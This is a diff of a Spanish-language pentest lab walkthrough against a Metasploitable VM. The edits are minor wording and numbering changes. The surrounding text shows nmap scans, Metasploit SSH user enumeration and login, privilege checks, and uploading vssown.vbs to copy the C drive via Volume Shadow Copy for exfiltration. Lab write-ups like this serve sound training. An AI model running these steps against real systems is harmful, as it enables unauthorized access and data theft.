@@ -44,6 +44,7 @@ Explicación previa:
 - **-p-** : Escanea todos los puertos en lugar de solo los más comunes.
 - **10.0.2.15**: IP de la víctima (VM Metasploitable).
 
+Se ingresa:
     sudo nmap -A -p- 10.0.2.15
 
 Resultado:
@@ -113,6 +114,7 @@ Permite identificar si el servicio SSH se encuentra activo en el puerto correspo
 Explicación:
 - **-sV:** Permite identificar los servicios activos y determinar la versión del software que se encuentra ejecutándose en los puertos abiertos.
 
+Se ingresa:
     sudo nmap -sV -p 22 10.0.2.15
 
 Resultado:
@@ -216,6 +218,8 @@ En el script de Metasploitable: se ha encontrado el potencial usuario **'vagrant
 
 - Recordar que tenemos que cambiar de módulo **(modulo actual: ssh_enunusers)** para realizar el **login**, con el comando **use auxiliary/scanner/ssh/ssh_login**.
 
+La terminal y comandos serían:
+
     msf6 auxiliary(scanner/ssh/ssh_anumusers)>use auxiliary/scanner/ssh/ssh_login
     msf6 auxiliary(scanner/ssh/ssh_login)>show options
     msf6 auxiliary(scanner/ssh/ssh_login)>set RHOSTS 10.0.2.15
@@ -255,6 +259,8 @@ Desde el lado del adversario (Metasploitable) es necesario comprobar los privile
 
 - Ambos son importantes para hacer la **COPIA** de un archivo en específico y exfiltrarlo/sacarlo hacia afuera (Kali Linux). Asimismo, ambos permiten crear una copia del dico C.
 
+La terminal y comandos serían:
+
     -sh-4.3$ bash
     C:\Users\vagrant>whoami
     C:\Users\vagrant>whoami /priv
@@ -272,7 +278,7 @@ En caso de que el archivo no esté disponible, puede descargarse previamente des
 
 Luego en la terminal de Kali ingresar el comando siguiente e ingresar la contraseña: 'vagrant', para copiar un archivo del computador local hacia el objetivo remoto: 
 
-     1. scp vssown.vbs vagrant@10.0.2.15:C:\\Users\\vagrant\\Downloads
+     scp vssown.vbs vagrant@10.0.2.15:C:\\Users\\vagrant\\Downloads
 
 *NOTA:** La máquina víctima (Metasploitable) debe de estar encendida para que se realice la copia.
 
@@ -323,7 +329,7 @@ Usos principales:
 ## **5.4. EJECUCIÓN DEL SCRIPT VSSOWN.VBS**
 Se inicia el servicio Volume Shadow Copy con el comando:
 
-     1. cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs /start
+      1. cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs /start
 
 La salida indica que el comando se ejecutó correctamente. El mensaje importante es: [*] Signal sent to start the VSS service.
 
